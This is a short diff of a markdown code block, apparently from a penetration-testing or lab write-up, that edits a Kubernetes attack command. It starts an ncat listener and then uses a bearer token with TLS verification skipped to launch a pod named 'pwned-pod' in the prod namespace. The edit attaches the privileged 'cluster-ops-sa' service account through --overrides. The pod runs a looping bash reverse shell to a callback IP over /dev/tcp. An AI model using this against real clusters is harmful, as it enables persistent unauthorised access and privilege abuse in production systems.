@@ -80,9 +80,15 @@ ncat -lvnp 5555 &
 CALLBACK_IP=
 kubectl --insecure-skip-tls-verify --token=$TOKEN run pwned-pod \
   -n prod \
-  --image=nginx:1.25 \
-  --serviceaccount=cluster-ops-sa \
+  --image=ubuntu \
   --restart=Never \
+  --overrides='
+{
+  "apiVersion": "v1",
+  "spec": {
+    "serviceAccountName": "cluster-ops-sa"
+  }
+}' \
   -- /bin/bash -c "while true; do bash -i >& /dev/tcp/${CALLBACK_IP}/5555 0>&1; sleep 2; done"
 ```
 
